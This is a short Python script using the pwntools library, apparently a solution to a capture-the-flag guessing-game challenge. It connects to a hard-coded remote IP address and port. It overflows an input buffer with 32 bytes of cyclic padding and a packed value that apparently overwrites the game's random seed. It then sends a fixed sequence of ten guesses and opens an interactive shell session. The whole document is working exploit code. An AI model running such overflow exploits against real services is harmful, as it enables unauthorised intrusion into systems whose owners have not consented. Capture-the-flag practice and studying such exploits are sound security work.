from pwn import *
import re

if __name__ == '__main__':
	flag = True
	seq = [b'4', b'5', b'5', b'4', b'3', b'1', b'5', b'4', b'3', b'3']
	# io = process('./pwn')
	io = remote('111.200.241.244', 62889)
	io.recv()
	io.send(cyclic(32) + p64(0xffffffff) + b'\n')
	io.recv()
	for i in range(10):
		io.send(seq[i] + b'\n')
		io.recv()
	io.interactive()